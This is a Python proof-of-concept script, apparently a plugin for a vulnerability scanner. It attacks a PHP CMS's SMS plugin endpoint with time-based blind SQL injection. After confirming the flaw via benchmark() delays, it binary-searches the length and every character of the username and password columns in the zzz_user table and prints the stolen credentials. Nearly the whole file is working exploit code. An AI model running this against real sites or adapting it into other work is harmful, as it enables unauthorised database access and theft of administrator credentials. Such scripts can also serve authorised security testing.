import requests
import time
from lib.comtroller.task import info


def poc():
    try:
        if not info.url:
            print("url is nor")
            exit()
        url = info.url+'/plugins/sms/sms_list.php?act=del'
        headers = {
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Accept-Language": "en-us",
                   "Connection": "keep-alive",
                   "Accept-Charset": "GB2312,utf-8;q=0.7,*;q=0.7",
        }

        payload = {
            "check": "id%5B%3D%28benchmark%28100000000%2Chex%28233333%29%29%29%23%5D=1",

            "userlength0": " id[%3d(benchmark(30000000*(length((select ",
            "userlength1": " from zzz_user limit 0,1))%3c",
            "userlength2": "),MD5(1)))%23]=1",

            "zzz_usercontent0": " id[%3d(benchmark(30000000*(ascii(substring((select ",
            "zzz_usercontent1": " from zzz_user),",
            "zzz_usercontent2": ",1))%3c",
            "zzz_usercontent3": "),MD5(1)))%23]=1",

        }

        reqtime = requests.post(url, headers=headers, timeout=30)
        if reqtime.elapsed.total_seconds() > 1.5:
            print('%s'%'网络堵塞...')

        req = requests.post(url, headers=headers,data=payload["check"],timeout=30)
        if req.elapsed.total_seconds()>2:
            print(url+"  存在sql注入")
            if info.check=='yes':
                exit()
        else:
            print(url+" 不存在sql注入")
            exit()



        ##################################################
        #zzz_userlength
        zzz_user = ['username','password']
        zzz_user_length={}
        print('%s'%'猜测username,password数据长度中...')
        for i in zzz_user:
            max = int(64)
            min = int(1)
            length = 0
            while (min < max):
                mid = int(max + min) // 2
                if length == mid:
                    print('%s %s %d' % (i,'内容长度为：', length))
                    zzz_user_length[i]=str(length)
                    break
                req = requests.post(url, headers=headers,
                                    data=payload["userlength0"] +str(i)+payload["userlength1"]+str(mid) + payload["userlength2"], timeout=30)
                if req.elapsed.total_seconds() < 2:
                    min = mid
                else:
                    max = mid
                length = mid


        ##################################################
        #zzz_user Cention
        namePassword = {}
        print('%s'%"猜测账号密码中...")
        for i in zzz_user_length:
            cention = ""
            for z in range(int(zzz_user_length[i])):
                max = int(132)
                min = int(32)
                x = 0
                while (min < max):
                    mid = int(max + min) // 2
                    if x == mid:
                        cention+=(chr(x))
                        break
                    req = requests.post(url, headers=headers,
                                        data=payload["zzz_usercontent0"] + str(i) + payload["zzz_usercontent1"]+str(z+1)+payload["zzz_usercontent2"]+ str(
                                            mid) + payload["zzz_usercontent3"], timeout=30)
                    if req.elapsed.total_seconds() < 2:
                        min = mid
                    else:
                        max = mid
                    x = mid
            namePassword[i]=cention
        print(namePassword)


    except Exception as e:
        print(e)
        print("error")

poc()
